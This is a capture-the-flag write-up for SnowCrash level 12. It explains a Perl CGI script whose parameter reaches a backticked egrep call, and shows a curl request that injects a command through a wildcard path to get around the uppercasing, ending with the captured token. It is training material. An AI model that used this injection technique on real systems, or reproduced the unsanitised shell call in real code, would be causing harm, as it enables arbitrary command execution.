level12@SnowCrash:~$ ls
level12.pl
level12@SnowCrash:~$ cat level12.pl
#!/usr/bin/env perl
# localhost:4646
use CGI qw{param};
print "Content-type: text/html\n\n";

sub t {
  $nn = $_[1];
  $xx = $_[0];
  $xx =~ tr/a-z/A-Z/;
  $xx =~ s/\s.*//;
  @output = `egrep "^$xx" /tmp/xd 2>&1`;
  foreach $line (@output) {
      ($f, $s) = split(/:/, $line);
      if($s =~ $nn) {
          return 1;
      }
  }
  return 0;
}

sub n {
  if($_[0] == 1) {
      print("..");
  } else {
      print(".");
  }
}

n(t(param("x"), param("y")));

this is a perl scrit thats running in localhost:4646

it uses CGI which allows it to extract the passed in parameters. the script takes in two parameters as variables x and y and passes them to the subroutine or function t, and the result is passed to function n which simply prints dots.
the t function turns all the characters in the first parameter to capital letters and also will delete anything after a space.
and then the string is passed to egrep which looks for a match in /tmp/xd and also evaluates  our string, and thatst he part we r gonna exploit, by giving it the  path of a file that contains getflag

level12@SnowCrash:~$ cat /tmp/OK
getflag > /tmp/ew

now lets use curl to make the request, 


level12@SnowCrash:~$ curl localhost:4646/?x='`/*/ok`'

level12@SnowCrash:~cat /tmp/ew
Check flag.Here is your token : g1qKMiRpXf53AWhDaU7FEkczr


